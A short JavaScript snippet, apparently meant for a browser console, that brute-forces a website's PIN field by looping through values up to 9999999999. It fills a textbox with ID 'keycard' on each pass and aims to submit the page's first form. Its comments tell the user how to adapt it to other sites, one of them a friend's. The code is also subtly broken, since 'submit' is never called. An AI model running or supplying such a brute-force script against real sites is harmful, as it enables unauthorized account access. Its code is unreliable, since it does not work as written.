var max_pin = 9999999999 // Set this to the maximum amount of characters the site allows
for(var pin=0000000000;pin<=max_pin;pin++) // Set the pin var to the starting pin
{ 
    document.getElementById('keycard').value=pin; // Change "keycard" to the ID of the textbox

    // Change this form to any form you want, in my case, my friend didn't put any identifier for his form :/
    document.forms[0].submit 
    console.log("pin "+pin)

}
